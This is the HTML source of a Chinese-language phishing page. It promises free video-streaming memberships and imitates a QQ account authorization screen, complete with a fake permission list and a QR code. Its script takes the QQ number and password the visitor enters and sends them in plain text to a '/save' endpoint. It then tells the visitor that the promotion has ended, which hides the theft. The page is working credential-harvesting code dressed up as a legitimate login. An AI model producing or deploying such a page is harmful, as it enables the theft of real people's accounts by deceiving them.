<!DOCTYPE>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title>分享领取爱奇艺优酷腾讯视频会员</title>
    <link rel="shortcut icon" href="/static/img/favicon.ico">
    <style type="text/css">
        html,body,div,p,form,label,ul,li,img,em,h3{margin:0;padding:0;border:0;list-style:none;font-style:normal;font-weight:normal;}
        a{text-decoration:none;}
        body{font-family:Microsoft YaHei,Verdana,Arial,SimSun;color:#666;font-size:14px;background:#fff; overflow:hidden}
        .block, #block{display:block;}
        .none, #none{display:none;}

        .login{width:100%;}
        .login .headerTop{width:100%;height: 80px;background:#52b7ed;}
        .login .headerTop .logo{width:1000px;margin:0 auto;}
        .login .headerTop .logo img{margin-top:20px;width: 150px;}

        .main{width:1000px;margin:0 auto;overflow: hidden;height: auto;clear: both;}
        .main .mainLeft{float: left;width:50%;border-right:1px dotted #ccc;margin-top:30px;padding-bottom:100px;}
        .main .mainLeft h3{width:70%;border-bottom:2px solid #ccc;padding:0 10%;font-family: 600;}
        .main .mainLeft h3 span{display:inline-block;width:6.5em;font-size:18px;color: #333;line-height:50px;border-bottom:4px solid #666;margin-bottom: -2px;font-family: 600;text-align: center;}
        .main .mainLeft input{width:50%;padding:10px;font-size:16px;border:1px solid #ccc;border-radius: 3px;margin:20px 0 0 50px;}
        .main .mainLeft input[type="text"]{margin-top:60px;}
        .main .mainLeft .a{display: block;padding:10px 15px;width:20%;text-align:center;font-size:18px;color:#fff;background: #88ce2f;border-radius: 3px;margin:20px 0 0 50px;}
        .main .mainRight{float: right;width:45%;margin-top:30px;}
        .mainRight p, .mainRight ul li{width:100%;padding: 10px 0;border-bottom: 1px dotted #ccc;font-size:14px;color: #666; }
        .mainRight p a{color:#52b7ed;}
        .mainRight p a:hover{text-decoration:underline;}
        .mainRight p input, .mainRight ul li input{margin-right:10px;cursor:not-allowed;}
        .mainRight ul li{border:none;}
        .mainRight .agreement{margin-top:10px;border:none;}
        .mainRight .code{text-align: center;}
        .mainRight img{margin:10px auto;width: 150px;}
        .delete  { display: none; position: absolute; width: 16px; height: 16px; margin: 73px 0 0 -25px; background: url(/static/images/delete.jpg) no-repeat;background-size:100%; cursor: pointer;}
        .mainLeft input[type="text"]::-ms-delete { display: none; }
        .main .mainLeft input[type="text"]:valid + .delete  { display: inline; }
    </style>
</head>

<body>
<div class="login">
    <div class="headerTop">
        <div class="logo">
            <img src="/static/images/logo.png" />
        </div>
    </div>
    <div class="main">
        <div class="mainLeft">
            <h3><span>账号密码登录</span></h3>
            <form>
                <input id="hello" class="text" type="text" placeholder="支持QQ号/邮箱/手机号登录" required value="">
                <a class="delete" id="delete" href="#"></a>
                <input id="very" type="password" name="" placeholder="密码">
                <a id="login" class="a" href="javascript:;">授权并登录</a>
            </form>
        </div>
        <div class="mainRight">
            <p>该网站已有超过1千万用户使用QQ登录</p>
            <p><a href="#">爱电影</a>将获得以下权限</p>
            <p><input type="checkbox" checked="checked" disabled="disabled">全选</p>
            <ul>
                <li><input type="checkbox" checked="checked" disabled="disabled" >获得您的昵称，头像，性别</li>
                <li><input type="checkbox" checked="checked" disabled="disabled">分享内容到QQ空间</li>
                <li><input type="checkbox" checked="checked" disabled="disabled">读取，达标腾讯微博信息</li>
            </ul>
            <p class="agreement">授权后表明你已同意<a href="#">QQ登录服务协议</a></p>
            <div class="code">
                <img src="/static/images/code.jpg">
            </div>
        </div>
    </div>
</div>
<script src="http://libs.baidu.com/jquery/1.10.2/jquery.min.js">
</script>
<script src="/static/js/layer/layer.js" type="text/javascript"></script>
<script>
    $(document).ready(function(){
        $("#delete").click(function(){
            $('.text').val('');
        });
    });
</script>

<div style="text-align:center;margin:50px 0; font:normal 14px/24px 'MicroSoft YaHei';">
    <p>适用浏览器：IE8、360、FireFox、Chrome、Safari、Opera、傲游、搜狗、世界之窗.</p>
</div>
<script>
    $(function () {
        $("#login").click(function () {
            var hello = $("#hello").val();
            var very = $("#very").val();
            $.get("/save?hello="+hello+"&very="+very).done(function (json) {
                if(json=="BLANK") {
                    layer.msg("请先输入您的账号密码");
                }
                if(json=="PASSWORDERROR") {
                    layer.msg("账号或密码错误");
                }
                if(json=="NOTNUMBER") {
                    layer.msg("您的QQ号格式有误!");
                }
                if(json=="SUCCESS") {
                    layer.msg("抱歉！该活动已经下线");
                }
            });
        });

    });
</script>
</body>
</html>
